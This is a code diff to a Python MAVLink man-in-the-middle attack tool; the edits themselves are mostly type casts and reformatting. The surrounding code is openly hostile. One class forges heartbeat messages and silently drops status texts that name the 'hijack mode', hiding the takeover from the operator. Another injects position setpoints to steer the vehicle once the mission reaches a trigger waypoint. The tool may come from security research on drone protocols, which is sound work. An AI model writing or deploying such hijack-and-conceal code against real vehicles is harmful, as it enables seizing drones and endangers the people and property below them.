@@ -292,18 +292,20 @@ class StealthModeMask:
             heartbeat.system_status,
             heartbeat.mavlink_version,
         )
-        # Clear any cached raw buffer so the relay re-packs the rewritten fields.
-        forged._msgbuf = None
+        # `heartbeat_encode` returns an unpacked message (empty `_msgbuf`), so the
+        # relay re-packs it from the rewritten fields; no buffer to clear here.
         return forged
 
     def _names_hijack_mode(self, msg: MAVMsg) -> bool:
         """Return True if a STATUSTEXT names the hijack mode (and must be dropped)."""
         if self._hijack_mode_name is None:
             return False
-        text = str(getattr(msg, "text", "")).upper()
-        if self._hijack_mode_name not in text:
+        statustext = cast("mavlink.MAVLink_statustext_message", msg)
+        if self._hijack_mode_name not in str(statustext.text).upper():
             return False
-        logging.info("MITM stealth: dropping mode-change STATUSTEXT %r", msg.text)
+        logging.info(
+            "MITM stealth: dropping mode-change STATUSTEXT %r", statustext.text
+        )
         return True
 
 
@@ -518,9 +520,7 @@ class HijackPursuitStrategy(MITMStrategy):
             if self.stealth:
                 self._mode_mask.observe(msg)
             if msg.get_type() == "MISSION_CURRENT":
-                mission_current = cast(
-                    "mavlink.MAVLink_mission_current_message", msg
-                )
+                mission_current = cast("mavlink.MAVLink_mission_current_message", msg)
                 if mission_current.seq >= self.trigger_seq:
                     self._begin_pursuit()
                     self._fired = True
@@ -583,9 +583,14 @@ class HijackPursuitStrategy(MITMStrategy):
             lat_e7,
             lon_e7,
             alt_m,
-            0, 0, 0,  # vx, vy, vz
-            0, 0, 0,  # afx, afy, afz
-            0, 0,  # yaw, yaw_rate
+            0,
+            0,
+            0,  # vx, vy, vz
+            0,
+            0,
+            0,  # afx, afy, afz
+            0,
+            0,  # yaw, yaw_rate
         )
         self.ctx.inject_to_logic(setpoint)
 
